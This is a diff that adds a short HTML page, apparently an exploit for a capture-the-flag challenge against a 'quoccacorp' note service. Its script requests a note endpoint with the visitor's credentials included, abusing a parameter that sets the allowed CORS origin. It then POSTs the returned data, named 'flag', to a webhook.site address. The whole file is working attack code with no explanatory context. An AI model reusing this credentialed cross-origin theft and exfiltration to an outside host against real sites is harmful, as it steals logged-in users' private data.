@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const API = "https://cors-api.quoccacorp.com/note?cors-allow-origin=" + window.location.origin;
+        const WEBHOOK = "https://webhook.site/ac3c1f08-eab5-451a-b5c0-2d9e21ce0eca";
+
+        fetch(API, { credentials: "include" })
+            .then(r => r.text())
+            .then(flag => {
+                fetch(WEBHOOK, { method: "POST", mode: "no-cors", body: flag });
+            });
+    </script>
+</body>
+</html>
